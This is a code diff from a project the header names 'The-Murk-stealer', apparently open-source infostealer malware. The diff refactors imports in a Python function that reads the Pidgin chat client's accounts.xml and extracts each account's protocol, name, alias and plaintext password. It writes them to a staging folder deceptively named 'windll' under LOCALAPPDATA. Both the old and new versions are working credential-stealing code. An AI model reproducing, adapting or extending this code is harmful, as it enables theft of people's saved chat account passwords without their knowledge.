@@ -9,15 +9,16 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import os
-import xml.etree.ElementTree as ET
+from os import getenv, mkdir
+from os.path import isfile
+from xml.etree.ElementTree import fromstring
 from manager.logger import Log
 
 
 def Pidgin():
     msgInfo = ""
-    roaming = os.getenv('APPDATA')
-    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll"
+    roaming = getenv('APPDATA')
+    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll"
     directory = [
         roaming + '\\.purple\\accounts.xml'
     ]
@@ -25,10 +26,10 @@ def Pidgin():
     
     for file in directory:
         try:
-            if os.path.isfile(file):
+            if isfile(file):
                 with open(file, "r", encoding="utf-8") as f:
                     content = f.read()
-                content = ET.fromstring(content)
+                content = fromstring(content)
                 accounts = content.findall("account")
                 for account in accounts:
                     protocol = account.findtext("protocol")
@@ -38,7 +39,7 @@ def Pidgin():
                     logs.append(f"Protocol: {protocol}\nName: {name}\nAlias: {alias}\nPassword: {password}\n")
             if logs:
                 msgInfo+="\n∟📨Pidgin"
-                os.mkdir(pathToLogs+"\\Pidgin\\")
+                mkdir(pathToLogs+"\\Pidgin\\")
                 with open(pathToLogs+"\\Pidgin\\accounts.txt", 'w', encoding='UTF-8') as f:
                     for log in logs:
                         f.write(log+'\n\n')
